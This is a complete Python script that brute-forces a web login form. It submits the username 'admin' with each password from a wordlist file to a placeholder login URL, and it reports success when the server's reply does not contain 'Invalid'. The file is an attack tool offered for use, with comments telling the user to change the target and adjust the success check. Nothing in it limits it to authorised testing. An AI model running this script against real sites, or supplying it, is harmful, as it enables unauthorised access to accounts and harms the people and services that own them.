import requests

# Target login page
url = "http://targetsite.com/login"  # CHANGE THIS

# Credentials to test
username = "admin"  # Set a default username
password_file = "passwords.txt"  # Wordlist file

# Read password list
def load_passwords():
    with open(password_file, "r") as f:
        return [line.strip() for line in f.readlines()]

# Perform login attempt
def try_login(password):
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, data=data)
    
    if "Invalid" not in response.text:  # Adjust this based on the site’s response
        print(f"[+] SUCCESS! Password found: {password}")
        return True
    return False

# Brute-force loop
def brute_force():
    passwords = load_passwords()
    print(f"[+] Loaded {len(passwords)} passwords. Starting attack...")

    for password in passwords:
        print(f"[-] Trying: {password}")
        if try_login(password):
            break  # Stop if we find the correct password

brute_force()
